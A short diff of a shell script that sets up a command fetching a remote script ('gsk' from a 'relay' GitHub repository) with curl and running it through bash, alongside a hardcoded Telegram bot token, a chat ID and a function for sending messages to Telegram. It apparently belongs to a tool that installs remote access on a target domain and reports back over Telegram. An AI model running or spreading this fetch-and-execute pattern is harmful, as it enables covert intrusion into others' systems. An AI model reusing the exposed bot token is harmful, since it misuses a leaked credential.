@@ -8,7 +8,7 @@ fi
 TOKEN="6598877714:AAFGR7OVC1YchGkhP8WrVinz4wwLAyVMSh8"
 CHAT_ID="-1002152193505"
 domain="$1"
-run_command="T=".www.ichalnod.my.id" bash -c "$(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsk)""
+run_command="bash -c "$(curl -fsSL https://raw.githubusercontent.com/paylar/relay/main/gsk)""
 
 send_to_telegram() {
   local message="$1"
